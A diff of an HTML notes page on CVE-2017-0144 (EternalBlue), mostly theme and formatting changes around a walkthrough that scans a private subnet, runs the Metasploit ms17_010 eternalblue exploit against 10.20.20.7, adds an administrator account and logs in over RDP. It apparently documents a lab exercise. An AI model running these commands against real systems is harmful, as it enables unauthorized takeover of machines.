@@ -1,20 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-12-31 Sat 00:21 -->
+<!-- 2023-02-02 Thu 21:55 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-0144</title>
 <meta name="author" content="Honbey Zhang" />
 <meta name="generator" content="Org Mode" />
-<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
+
+                     <!--
+                     <link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                      <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
+                     -->
+                     <!--
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.zclip.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
+                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     -->
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/htmlize.css" type="text/css"/>
+                     <link rel="stylesheet" href="../resources/src/readtheorg_theme/css/readtheorg.css" type="text/css"/>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/bootstrap.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
+                     <script type="text/javascript" src="../resources/src/readtheorg_theme/js/readtheorg.js"></script>
 </head>
 <body>
 <div id="content" class="content">
 <header>
 <h1 class="title">CVE-2017-0144</h1>
-</header>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org9861b14">Introduction - Eternal Blue</a>
+<ul>
+<li><a href="#org34f393b">步骤</a></li>
+<li><a href="#org5bd6bf7">Tips</a></li>
+<li><a href="#org7024046">参考链接</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+
 <div id="outline-container-org9861b14" class="outline-2">
 <h2 id="org9861b14">Introduction - Eternal Blue</h2>
 <div class="outline-text-2" id="text-org9861b14">
@@ -36,8 +72,8 @@
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">nmap</span> <span style="color: #D0372D;">-r</span> 10.20.20.0/<span style="color: #D0372D;">28</span> <span style="color: #8D8D84; font-style: italic;"># search target (optional)</span>
-<span style="color: #006DAF;">msfconsole</span>
+<pre class="src src-bash">nmap -r 10.20.20.0/28 # search target (optional)
+msfconsole
 </pre>
 </div></li>
 
@@ -45,12 +81,12 @@ Bash
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">search</span> ms17_010
-<span style="color: #006DAF;">use</span> auxiliary/scanner/smb/smb_ms17_010
-<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-<span style="color: #006DAF;">use</span> exploit/windows/smb/ms17_010_eternalblue
-<span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
+<pre class="src src-bash">search ms17_010
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 10.20.20.7
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 10.20.20.7
+run # exploit
 </pre>
 </div></li>
 
@@ -58,8 +94,8 @@ msfconsole
 meterpreter
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #8D8D84; font-style: italic;">#if it not enter CMD automatically, input the below command in meterpreter</span>
-<span style="color: #006DAF;">shell</span>
+<pre class="src src-bash">#if it not enter CMD automatically, input the below command in meterpreter
+shell
 </pre>
 </div></li>
 
@@ -77,9 +113,9 @@ net localgroup administrators USERNAME /add
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #006DAF;">rdesktop</span> 10.20.20.7:3389
-<span style="color: #8D8D84; font-style: italic;"># then input the USERNAME and PASSWORD you had created</span>
-<span style="color: #8D8D84; font-style: italic;"># now you can control the target machine</span>
+<pre class="src src-bash">rdesktop 10.20.20.7:3389
+# then input the USERNAME and PASSWORD you had created
+# now you can control the target machine
 </pre>
 </div></li>
 </ol>
@@ -115,7 +151,13 @@ It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack 
 </div>
 </div>
 <div id="postamble" class="status">
-<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+
+                     Theme
+                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow/readtheorg</a>
+                     by
+                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
+                     <br>
+                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
 </div>
 </body>
 </html>
